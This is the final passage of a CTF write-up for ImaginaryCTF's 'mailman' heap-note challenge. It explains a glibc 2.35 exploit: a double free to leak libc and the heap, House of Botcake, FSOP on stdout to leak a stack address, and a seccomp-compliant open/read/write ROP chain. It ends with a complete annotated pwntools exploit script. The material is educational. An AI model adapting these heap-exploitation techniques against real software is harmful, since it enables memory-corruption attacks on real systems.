With a proper stack address, we can now forge a chunk to be given to us located within the stack, and overwrite return pointers to hijack control flow. Ah... but _where_? The main function doesn’t actually return, it exits. What we can do is kind of silly, but instead of overwriting main’s stack frame, we’ll overwrite the stack frame of whatever lib function calls `read()`. That way, when we return from the read call after allocing a chunk, we instead return to our own control flow.

If we look at gdb, we can see our backtrace up to the read call:

```c
► f 0   0x7fedd0f14992 read+18
  f 1   0x7fedd0e8ccb6 _IO_file_underflow+390
  f 2   0x7fedd0e8de16 _IO_default_uflow+54
  f 3   0x7fedd0e63150 __vfscanf_internal+1776
  f 4   0x7fedd0e621c2 __isoc99_scanf+178
  f 5   0x559d76869498 main+375
```

So, what we’re instead going to do is find the offset of `_IO_file_underflow` return pointer, and forge a chunk to write there. We can reuse the chunks we made from our last arbitrary write, which simplifies things. The offset was computed via some trial and error, but the important feature is that it must be 16 byte aligned, otherwise malloc will crash when trying to alloc from the stack address.

```py
stack = u64(r.recv(8)[:-1].ljust(8, b'\x00')) -0x258 # offset computed in gdb
free(1) # free our forged chunk
free(2) # free our victim chunk
# write to our forged chunk (which again contains the metadata to victim)
alloc(1, 0x230, b'T'*0x208 + p64(0x211) + p64((stack ^ ((heap + 0x3320) >> 12))))
# alloc our victim chunk again.
alloc(2, 0x200, 'xxx')
# write padding and ROP chain
alloc(3, 0x200, b'A'*0xc8+ rop.chain())
```

As a final step, let’s discuss the ROP chain. Seccomp prevents us from calling `system` or `execve`, so we need to use `open`, `read`, and `write` to output the flag. The first step is find what can setup these syscalls, luckilly, libc gives us the great function `syscall()` which we can keep returning to to call these three functions. Next, I need to open `flag.txt`. This is not a complicated problem at all. Remember that 16 byte buffer I allocated during the botcake exploit to prevent consolidation? I can find the fixed offset of that chunk, and write `'flag.txt\0'` to it, and use that as my buffer for open. Then calling read and write becomes simple register operations.

pwntools is extremely useful in automating this process.

```py
rop = ROP(libc)
flagoffset = 0x55d31ac5f520 - 0x55d31ac5c000
flag = heap + flagoffset+16
output = flag + 0x20
syscall = libc.address + 171444
print("Flag.txt: ", hex(flag))
rop.call('syscall', [2, flag, 0, 0]) # open('flag.txt',0,0)
rop.call('syscall', [0, 3, output, 0x100]) #read(3, buf, 0x100)
rop.call('syscall', [1, 1, output, 0x100]) #write(1, buf, 0x100)
```

We can run the entire script and it prints out the flag on remote: `ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}`

## TLDR <a name="tldr"></a>

Heap Note Challenge with no update, arbitrary chunk size, with glibc2.35, full protections, OWR seccomp, no return, no `exit()`. Use double free and read after free to leak libc and heap, use House of Botcake to do FSOP on stdout to leak environ and get a stack leak. Write over return address of `_IO_file_underflow` during the read call of a note allocation to ROP to Open, Read, Write chain to get flag.

## Full Script (Annotated) <a name="script"></a>

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

context.binary = exe
# this makes tmux split vertically when debugging
context.terminal = ['tmux', 'splitw', '-f', '-h']
# I was going to beat safelinking another way, which is why this became a global
heap = 0x0
# pwninit’s stub conn() function. Call with `python3 solve.py LOCAL` or no args to change which.
def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("mailman.chal.imaginaryctf.org", 1337)

    return r

# Safelinking deobfuscation helper
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val


def main():
    global heap
    r = conn()

    def alloc(idx, size, data):
        print("ALLOCATING: ", idx)
        r.sendlineafter("> ", "1")
        r.sendlineafter("idx: ", str(idx))
        r.sendlineafter("size: ", str(size))
        r.sendlineafter("content: ", data)

    def free(idx):
        print("FREEING: ", idx)
        r.sendlineafter("> ", "2")
        r.sendlineafter("idx: ", str(idx))

    def show(idx):
        print("SHOWING: ", idx)
        r.sendlineafter("> ", "3")
        r.sendlineafter("idx: ", str(idx))
        return r.recvline()

    # Make two large chunks
    alloc(0, 1350, 'A')
    alloc(1, 1350, 'A')
    # Free the first one so bk = main_arena in libc
    free(0)
    resp = show(0)
    # parse the libc address in little-endian
    libcaddr = int(resp[5::-1].hex(),16)
    # Use offsets found in gdb to compute libc base
    libc.address = libcaddr - (0x7f7c10419ce0 - 0x7f7c10200000)
    print("Libc Leak: ", hex(libc.address))
    free(1)

    #Grab some blocks
    alloc(0,128,'A')
    alloc(1,128,'A')
    alloc(2,128,'A') #excess
    alloc(3,128,'A') #excess
    # Place them into the tcache
    free(0)
    free(1)
    free(2)
    show(0)
    show(1)
    #This printed out a heap address
    addr = show(2)
    free(3)
    #Parse, deobfuscate, and set heap base.
    addr = int(addr[5::-1].hex(),16)
    heap_leak = deobfuscate(addr)
    # seccomp actually alloc'd over a page of memory,
    # so base was -0x1000 from what I got.
    heap = (heap_leak >> 12 << 12) - 0x1000

    print("Heap Base: ", hex(heap))
    print("Cleaning tcaches + smallbins")
    for i in range(7):
        alloc(15, 16, 'A')
    for i in range(7):
        alloc(15, 0x60, 'A')
    for i in range(7):
        alloc(15, 0x70, 'A')
    for i in range(4):
        alloc(15, 0x80, 'A')
    for i in range(5):
        alloc(15, 0xc0, 'A')
    for i in range(2):
        alloc(15, 0xe0, 'A')
    for i in range(11):
        alloc(15, 0x20, 'A')
    for i in range(7):
        alloc(15, 0x10, 'A')
    alloc(15, 0x30, 'A')

    # Get environ and stdout
    environ = libc.symbols['environ']
    stdout = libc.symbols['_IO_2_1_stdout_']

    # House of botcake
    # Allocate 7 blocks of size 0x200, we’ll free them later
    # We can’t leak them as before, so place them into our mem array properly
    for i in range (7):
        alloc(9+i, 0x200, 'A')
    # Allocate our prev block and our victim block, along with the buffer
    alloc(6, 0x200, 'prev')
    alloc(7, 0x200, 'victim')
    alloc(8, 0x10, 'flag.txt\x00')
    # Fill the tcache!
    for i in range(7):
        free(9+i)

    # free our victim chunk
    free(7)
    # free our previous chunk (they are now consolidated)
    free(6)
    alloc(5, 0x200, 'X')  # Open up a slot in the tcache
    # double free vulnerablity, now victim is in the tcache!
    free(7)

    # We alloc the slightly larger chunk, getting a split of the [prev, victim] chunk
    # We’re going to write to it the necessary padding then:
    # 0x211, to preserve the size of the victim chunk
    # stdout ^ ((heap + 0x3320) >> 12), because we need to pass a safe-linked ptr.
    # Otherwise, malloc will crash. 0x3320 offset was found via debugging.
    alloc(1, 0x230, b'T'*0x208 + p64(0x211) + p64((stdout ^ ((heap + 0x3320) >> 12))))
    alloc(2, 0x200, 'X') # remove victim from the tcache again, updating the linked list structure
    # This alloc writes to stdout. It sets stdout’s write buffer to be environ, and sets flags to cause it to flush on next print
    alloc(3, 0x200, p64(0xfbad1800) + p64(environ)*3 + p64(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8))
    # When printf("> ") happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.
    stack = u64(r.recv(8)[:-1].ljust(8, b'\x00')) -0x258 # offset computed in gdb
    print("Stack Leak: ", hex(stack))

    # Setup our ROP chain through libc.
    rop = ROP(libc)
    # Use that buffer block as a flag buffer (offsets found through gdb)
    flagoffset = 0x55d31ac5f520 - 0x55d31ac5c000
    flag = heap + flagoffset+16
    # Just make the area after the flag chunk our buffer, its probably writable.
    output = flag + 0x20
    print("Flag.txt: ", hex(flag))
    # Use rop call to automatically generate function calls
    rop.call('syscall', [2, flag, 0, 0])
    rop.call('syscall', [0, 3, output, 0x100])
    rop.call('syscall', [1, 1, output, 0x100])

    free(1) # free our forged chunk
    free(2) # free our victim chunk
    # write to our forged chunk (which again contains the metadata to victim)
    alloc(1, 0x230, b'T'*0x208 + p64(0x211) + p64((stack ^ ((heap + 0x3320) >> 12))))
    # alloc our victim chunk again.
    alloc(2, 0x200, 'xxx')
    # allocs to somewhere on stack before _IO_file_underflow to hijack the return address of it.
    alloc(3, 0x200, b'A'*0xc8+ rop.chain())
    r.interactive()

if __name__ == "__main__":
    main()
```
